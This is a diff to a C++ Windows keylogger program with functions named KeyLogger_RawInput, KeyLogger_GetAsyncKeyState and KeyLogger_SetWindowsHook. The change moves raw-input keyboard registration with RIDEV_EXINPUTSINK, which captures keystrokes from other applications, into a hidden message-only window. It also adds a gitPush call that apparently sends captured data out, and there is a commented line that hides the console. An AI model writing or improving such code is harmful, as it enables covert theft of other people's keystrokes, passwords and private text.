@@ -12,8 +12,11 @@ int main(int argc, char* argv[]) {
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	//KeyLogger_GetAsyncKeyState();
-	KeyLogger_RawInput();
+	//KeyLogger_RawInput();	
 	//KeyLogger_SetWindowsHook();
+
+	gitPush("12345");
+	getchar();
 }
 
 void KeyLogger_GetAsyncKeyState() {
@@ -32,6 +35,16 @@ void KeyLogger_GetAsyncKeyState() {
 LRESULT CALLBACK wndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 
 	switch (msg) {
+		case WM_CREATE: {
+			RAWINPUTDEVICE rid = {};
+			rid.dwFlags = RIDEV_EXINPUTSINK;
+			rid.hwndTarget = hWnd;
+			rid.usUsage = 6; // keyboard
+			rid.usUsagePage = 1;
+
+			RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
+			break;
+		}
 		case WM_INPUT: {
 			RAWINPUT input = {};
 			UINT size = sizeof(input);
@@ -59,14 +72,6 @@ void KeyLogger_RawInput() {
 	RegisterClassEx(&wcx);
 
 	HWND hWnd = CreateWindowEx(0, wcx.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
-
-	RAWINPUTDEVICE rid = {};
-	rid.dwFlags = RIDEV_EXINPUTSINK;
-	rid.hwndTarget = hWnd;
-	rid.usUsage = 6; // keyboard
-	rid.usUsagePage = 1; //
-
-	RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
 
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0)) {
